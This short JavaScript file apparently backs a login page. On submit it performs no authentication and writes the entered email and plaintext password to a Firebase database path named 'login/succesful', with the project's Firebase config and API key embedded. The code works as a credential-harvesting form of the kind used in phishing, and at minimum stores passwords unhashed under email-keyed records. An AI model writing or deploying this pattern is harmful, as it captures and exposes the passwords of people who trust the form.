let mail=document.querySelector('#email');
let password=document.querySelector('#password');
let submit=document.querySelector('#submit');

const firebaseConfig = {
  apiKey: "AIzaSyCjWBDq-cAVdQvicf4k4boUyA9lq1sj4oc",
  authDomain: "loginwebsite-132f9.firebaseapp.com",
  projectId: "loginwebsite-132f9",
  storageBucket: "loginwebsite-132f9.appspot.com",
  messagingSenderId: "566951139193",
  appId: "1:566951139193:web:917373603786304f0f01a8"
};


firebase.initializeApp(firebaseConfig);
var db = firebase.database()
submit.onclick=function()
{
  db.ref(`login/succesful/${mail.value}`).set({
password:password.value
  })
}